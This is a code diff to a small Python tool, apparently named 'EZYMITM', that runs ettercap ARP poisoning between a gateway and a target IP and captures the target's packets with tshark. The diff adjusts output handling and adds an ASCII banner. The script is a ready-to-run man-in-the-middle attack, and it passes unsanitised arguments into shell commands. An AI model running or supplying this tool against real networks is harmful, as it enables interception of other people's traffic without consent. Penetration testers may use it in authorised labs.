@@ -14,10 +14,8 @@ class Colors:
 
 def run_ettercap(iface: str, gateway: str, target: str):
     try:
-        output = os.system(
-            f"sudo ettercap -T -S -D -q -i {iface} -M arp:remote /{gateway}// /{target}//")
-
-        print(Colors.GREEN + str(output))
+        os.system(
+            f"sudo ettercap -T -S -D -i {iface} -M arp:remote /{gateway}// /{target}//")
 
     except PermissionError as pe:
         print(Colors.RED + pe)
@@ -25,11 +23,10 @@ def run_ettercap(iface: str, gateway: str, target: str):
 
 
 def run_tshark(iface: str, target: str):
-    try:
-        output = os.system(
-            f"sudo tshark -i {iface} -Y 'ip.addr == {target}'")
+    print(Colors.GREEN)
 
-        print(Colors.GREEN + str(output))
+    try:
+        os.system(f"sudo tshark -i {iface} -Y 'ip.addr == {target}'")
 
     except PermissionError as pe:
         print(Colors.RED + pe)
@@ -47,6 +44,15 @@ if __name__ == "__main__":
     parser.add_argument("-t", "--target", help="The target IP address")
 
     args = parser.parse_args()
+
+    print(Colors.BLUE + '''
+███████╗███████╗██╗░░░██╗███╗░░░███╗██╗████████╗███╗░░░███╗
+██╔════╝╚════██║╚██╗░██╔╝████╗░████║██║╚══██╔══╝████╗░████║
+█████╗░░░░███╔═╝░╚████╔╝░██╔████╔██║██║░░░██║░░░██╔████╔██║
+██╔══╝░░██╔══╝░░░░╚██╔╝░░██║╚██╔╝██║██║░░░██║░░░██║╚██╔╝██║
+███████╗███████╗░░░██║░░░██║░╚═╝░██║██║░░░██║░░░██║░╚═╝░██║
+╚══════╝╚══════╝░░░╚═╝░░░╚═╝░░░░░╚═╝╚═╝░░░╚═╝░░░╚═╝░░░░░╚═╝
+          ''')
 
     proc_ettercap = Process(target=run_ettercap(
         args.iface, args.gateway, args.target))
